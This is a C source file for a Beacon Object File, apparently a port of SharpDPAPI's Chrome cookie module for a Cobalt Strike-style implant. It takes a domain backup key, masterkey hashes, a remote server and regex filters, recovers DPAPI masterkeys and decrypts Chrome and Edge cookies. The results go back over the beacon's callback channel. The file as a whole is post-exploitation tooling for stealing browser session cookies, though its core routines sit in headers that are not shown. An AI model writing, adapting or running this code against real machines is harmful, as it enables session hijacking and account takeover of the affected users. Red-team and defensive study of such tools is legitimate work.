/*
 * chrome_cookies.c — BOF for Chrome cookie extraction
 *
 * Usage:
 *   chrome_cookies [/pvk:BASE64] [/credkey:KEY] [/server:SERVER]
 *                  [/target:PATH] [/unprotect] [/statekey:HEX]
 *                  [/cookie:REGEX] [/url:REGEX] [/rpc]
 *
 * Decrypts Chrome/Edge cookies from Cookie database files.
 */
#include "beacon.h"
#include "bofdefs.h"
#include "dpapi_common.h"
#include "triage.h"
#include "helpers.h"

void go(char* args, int args_len) {
    datap parser;
    BeaconDataParse(&parser, args, args_len);

    char* pvk_b64      = BeaconDataExtract(&parser, NULL);
    char* credkey      = BeaconDataExtract(&parser, NULL);
    char* server_str   = BeaconDataExtract(&parser, NULL);
    char* target_str   = BeaconDataExtract(&parser, NULL);
    char* statekey_hex = BeaconDataExtract(&parser, NULL);
    char* cookie_regex = BeaconDataExtract(&parser, NULL);
    char* url_regex    = BeaconDataExtract(&parser, NULL);
    int   unprotect    = BeaconDataInt(&parser);
    int   use_rpc      = BeaconDataInt(&parser);

    BYTE* pvk = NULL;
    int pvk_len = 0;
    if (pvk_b64 && strlen(pvk_b64) > 0)
        pvk = base64_decode(pvk_b64, &pvk_len);

    wchar_t* target = NULL;
    wchar_t* server = NULL;
    if (target_str && strlen(target_str) > 0) target = utf8_to_wide(target_str);
    if (server_str && strlen(server_str) > 0) server = utf8_to_wide(server_str);

    BYTE* state_key = NULL;
    int sk_len = 0;
    if (statekey_hex && strlen(statekey_hex) > 0)
        state_key = hex_to_bytes(statekey_hex, &sk_len);

    MASTERKEY_CACHE cache;
    mk_cache_init(&cache);

    /* Pre-load keys */
    if (credkey && strlen(credkey) > 0) {
        char* ck = (char*)intAlloc(strlen(credkey) + 1);
        if (ck) {
            strcpy(ck, credkey);
            char* pair = strtok(ck, ",");
            while (pair) {
                char* colon = strchr(pair, ':');
                if (colon) {
                    *colon = 0;
                    GUID guid;
                    if (string_to_guid(pair, &guid)) {
                        int sha1_len = 0;
                        BYTE* sha1 = hex_to_bytes(colon + 1, &sha1_len);
                        if (sha1 && sha1_len == 20) mk_cache_add(&cache, &guid, sha1);
                        if (sha1) intFree(sha1);
                    }
                }
                pair = strtok(NULL, ",");
            }
            intFree(ck);
        }
    }

    if (pvk || use_rpc) {
        triage_user_masterkeys(&cache, pvk, pvk_len,
            NULL, NULL, NULL, (BOOL)use_rpc, NULL, server, FALSE, NULL);
    }

    BeaconPrintf(CALLBACK_OUTPUT, "\n=== SharpDPAPI Chrome Cookies (BOF) ===\n");

    triage_chrome_cookies(&cache, target, server, (BOOL)unprotect,
                          state_key, sk_len,
                          (cookie_regex && strlen(cookie_regex) > 0) ? cookie_regex : NULL,
                          (url_regex && strlen(url_regex) > 0) ? url_regex : NULL);

    mk_cache_free(&cache);
    if (pvk) intFree(pvk);
    if (target) intFree(target);
    if (server) intFree(server);
    if (state_key) intFree(state_key);
}
